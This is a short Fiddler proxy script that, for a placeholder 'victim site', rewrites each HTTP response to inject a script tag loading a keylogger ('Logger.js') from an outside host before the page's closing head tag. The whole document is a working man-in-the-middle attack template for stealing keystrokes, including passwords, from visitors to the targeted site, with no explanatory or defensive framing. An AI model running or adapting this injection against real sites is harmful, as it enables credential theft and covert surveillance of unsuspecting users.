
//Fiddler Script
static function OnBeforeResponse(oSession: Session) {
        
        if (oSession.hostname.Contains("InsertTheVictimSiteHere.com")) 
        {
            oSession.utilDecodeResponse();
            oSession.utilReplaceInResponse('</head>', '<script src="http://lekeylogger.azurewebsites.net/Logger.js"></script>' + '</head>');
        }
        
    }
	
	